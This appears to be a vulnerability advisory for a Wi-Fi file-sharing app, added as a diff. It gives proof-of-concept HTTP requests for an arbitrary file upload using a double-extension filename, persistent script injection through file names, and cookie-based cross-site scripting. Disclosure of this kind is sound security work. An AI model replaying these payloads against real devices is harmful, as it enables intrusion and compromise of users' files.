@@ -1,0 +1,85 @@
+1. An arbitrary-file-upload vulnerability:
+
+PoC: POST REQUEST METHOD - FILE UPLOAD
+
+Host=192.168.2.104:8080
+
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0
+
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language=en-US,en;q=0.5
+
+Accept-Encoding=gzip, deflate
+DNT=1
+
+Referer=http://www.example.com/
+
+Connection=keep-alive
+Content-Type=multipart/form-data; 
+boundary=---------------------------48201118910051
+Content-Length=98447
+POSTDATA =-----------------------------48201118910051
+Content-Disposition: form-data; name="newfile"; filename="hacki-hack.png.txt.html.php.gif[FILE UPLOAD VULNERABILITY]"
+Content-Type: image/gif
+?PNG ...
+
+
+
+Review:
+[{'name':'.Private', 'id':0},{'name':'1234.png.txt.iso.php.gif', 'id':1},{'name':'Recents', 
+'id':2},{'name':'benjamin.html', 'id':3}]
+
+
+Reference(s):
+http://www.example.com/files
+
+2. An HTML injection vulnerability:
+
+PoC: File Name - Index Output Listing
+
+<a href="http://www.example.com/files/%3E%22%3Ciframe%20src=a%3E"; class="file">
+
+    "<[PERSISTENT SCRIPT CODE INJECT VULNERABILITY!] 
+    src="Welcome%20to%20Evereader%20Wi-Fi%20Sharing%21_files/hack.txt"></a><
+
+/td><td
+ class='del'><form action='/files/%3E%22%3C[PERSISTENT SCRIPT CODE INJECT VULNERABILITY!]%3E' 
+method='post'><input name='_method' value='delete' 
+type='hidden'/><input name="commit" type="submit" value="Delete" 
+class='button' /></td></tr></tbody></table></iframe></a>
+
+
+
+3. A cross-site scripting vulnerability:
+
+PoC: GET REQUEST METHOD - File Request
+
+--- Request Header ---
+Host=192.168.2.104:8080
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0
+Accept=application/json, 
+text/javascript, */*
+Accept-Language=en-US,en;q=0.5
+Accept-Encoding=gzip, deflate
+DNT=1
+X-Requested-With=XMLHttpRequest
+
+Referer=http://www.example.com/
+Cookie=USERID=<SCRIPT>document.cookie=true</SCRIPT>; true
+Connection=keep-alive
+
+
+--- Response Header ---
+Status=OK - 200
+Accept-Ranges=bytes
+Content-Length=171
+Cache-Control=private, max-age=0, must-revalidate
+Content-Type=text/plain; 
+charset=utf-8
+Date=Fr., 26 Apr 2013 17:48:48 GMT
+
+
+URL: http://www.example.com/files?Fri%20Apr%2026%202013%2019:46:51%20GMT+0200
+
+
